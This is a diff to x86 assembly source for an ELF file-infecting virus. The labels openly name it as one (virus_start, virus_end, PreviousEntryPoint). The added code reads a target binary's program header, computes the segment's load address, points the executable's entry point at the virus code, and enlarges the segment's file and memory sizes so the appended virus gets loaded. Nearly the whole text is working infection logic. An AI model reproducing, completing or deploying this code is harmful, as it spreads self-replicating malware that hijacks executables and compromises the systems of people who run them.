@@ -120,7 +120,7 @@ load_Ehdr:
     cmp		eax, 0
     jl		FailExit
     mov		eax, ebp
-    sub		eax, (16 + EHDR_size)
+    sub		eax, (20 + EHDR_size)
     read	[ebp - 8], eax, EHDR_size
     cmp		eax, 0
     jle		FailExit
@@ -130,33 +130,42 @@ save_prev_entry:
     cmp     eax, 0
     jl      FailExit
     mov		eax, ebp                   ; get a pointer to the header
-    sub		eax, ((16 + EHDR_size) - ENTRY)
+    sub		eax, ((20 + EHDR_size) - ENTRY)
     write   [ebp - 8], eax, 4
     cmp		eax, 0
     jle		FailExit
 
-load_PHDR:
+load_PHDRs:
     .get_offset:
     mov     eax, ebp                ; get the ptr to the phdr offset
-    sub     eax, ((16 + EHDR_size) - PHDR_start)
+    sub     eax, ((20 + EHDR_size) - PHDR_start)
     mov     ecx, [eax]              ; save the offset on the stack
     mov     [ebp - 16], ecx
+    add     dword [ebp - 16], PHDR_size
 
-    .read_PHDR:
+    .read_PHDRs:
     lseek   [ebp - 8], [ebp - 16], SEEK_SET
     cmp		eax, 0
     jl		FailExit
     mov     eax, ebp
-    sub     eax, (16 + EHDR_size + PHDR_size*2)
-    read    [ebp - 8], eax, PHDR_size*2
+    sub     eax, (20 + EHDR_size + PHDR_size)
+    read    [ebp - 8], eax, PHDR_size
     cmp		eax, 0
     jle		FailExit
 
+save_segment_start_addr:
+    mov     eax, ebp
+    sub     eax, (20 + EHDR_size + PHDR_size)
+    mov     ecx, [eax + PHDR_vaddr]
+    sub     ecx, [eax + PHDR_offset]
+    mov     [ebp - 20], ecx
+
 modify_entry:
     mov		eax, ebp                   ; get a pointer to the header
-    sub		eax, (16 + EHDR_size)
-    mov		ecx, [ebp - 12]            ; get the adress to write into ecx
-    add		ecx, (FILE_START_ADDR + (_start - virus_start))
+    sub		eax, (20 + EHDR_size)
+    mov     ecx, [ebp - 20]            ; get the new adress into ecx
+    add		ecx, [ebp - 12]
+    add		ecx, (_start - virus_start)
     mov		dword [eax + ENTRY], ecx   ; write the adress into the header
 
 overload_Ehdr:
@@ -164,8 +173,28 @@ overload_Ehdr:
     cmp		eax, 0
     jl		FailExit
     mov		eax, ebp
-    sub		eax, (16 + EHDR_size)
+    sub		eax, (20 + EHDR_size)
     write	[ebp - 8], eax, EHDR_size
+    cmp		eax, 0
+    jle		FailExit
+
+modify_file_size:
+    mov     eax, ebp
+    sub     eax, (20 + EHDR_size + PHDR_size)
+    mov     ebx, [eax + PHDR_offset]
+    mov     ecx, [ebp - 12]
+    add     ecx, (virus_end - virus_start)
+    sub     ecx, ebx
+    mov     [eax + PHDR_filesize], ecx
+    mov     [eax + PHDR_memsize], ecx
+
+overload_PHDRs:
+    lseek   [ebp - 8], [ebp - 16], SEEK_SET
+    cmp		eax, 0
+    jl		FailExit
+    mov		eax, ebp
+    sub		eax, (20 + EHDR_size + PHDR_size)
+    write	[ebp - 8], eax, PHDR_size
     cmp		eax, 0
     jle		FailExit
 
@@ -201,6 +230,3 @@ FailStrLen equ $ - FailStr - 1
 
 PreviousEntryPoint: dd VirusExit
 virus_end:
-
-
-
